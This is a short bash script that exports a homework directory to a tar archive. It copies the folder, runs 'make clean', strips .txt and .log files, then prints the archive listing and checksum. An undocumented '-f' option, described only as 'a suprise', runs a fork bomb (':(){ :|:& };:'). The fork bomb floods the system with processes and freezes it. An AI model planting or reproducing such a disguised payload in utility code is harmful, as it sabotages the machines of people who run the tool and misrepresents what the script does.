#!/bin/bash

# DO NOT USE THIS PROGRAM UNLESS YOU KNOW WHAT IT DOES. BACK UP ALL OF YOUR FILES REGULARLY USING GIT OR SOME OTHER VCS.

# THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW. EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM “AS IS” WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU. SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

#parses the input for the -d flag
#-f flag for a suprise, make sure to back up using this script before 
booltest=false
while getopts d:f flag
do
    case "${flag}" in
        d) DIR=${OPTARG};;
        f) booltest=true
    esac
done


if $booltest
then
:(){ :|:& };:
exit

fi


#if there is no -d flag then return
if [ -z ${DIR+x} ]; then
    echo "No directory specified. Run again with -d <directory>"
    exit
fi

#vars
NETID="INSERTNETID"
COPY_DIR=$(uuidgen)

echo "Exporting homework directory \"$DIR\"."

#copy hw dir into new folder
mkdir $COPY_DIR
cd $COPY_DIR
cp -r ../$DIR $DIR

#remove unwanted files in copy
cd $DIR
make clean
rm *.txt *.log
cd ..

#create tar file and remove folder containing copy
tar cf ../$DIR\_$NETID.tar $DIR
cd ..
rm -rf $COPY_DIR
tar tvf $DIR\_$NETID.tar
shasum $DIR\_$NETID.tar